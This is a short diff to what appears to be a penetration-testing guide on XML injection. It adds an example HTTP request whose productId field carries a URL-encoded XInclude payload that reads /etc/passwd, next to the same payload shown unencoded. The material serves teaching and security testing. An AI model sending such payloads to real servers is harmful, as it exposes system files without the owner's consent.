@@ -112,6 +112,17 @@ Some applications receive client-submitted data, embed it on the server-side int
 <xi:include parse="text" href="file:///etc/passwd"/></foo>
 ```
 
+```http
+POST /product/stock HTTP/2
+Host: vulnerable.website.com
+[...]
+
+
+
+productId=<foo+xmlns%3axi%3d"http%3a//www.w3.org/2001/XInclude">
+<xi%3ainclude+parse%3d"text"+href%3d"file%3a///etc/passwd"/></foo>&storeId=1
+```
+
 ### <mark style="color:yellow;">Via file upload</mark>
 
 Some common file formats use XML or contain XML subcomponents. Examples of XML-based formats are office document formats like DOCX and image formats like SVG
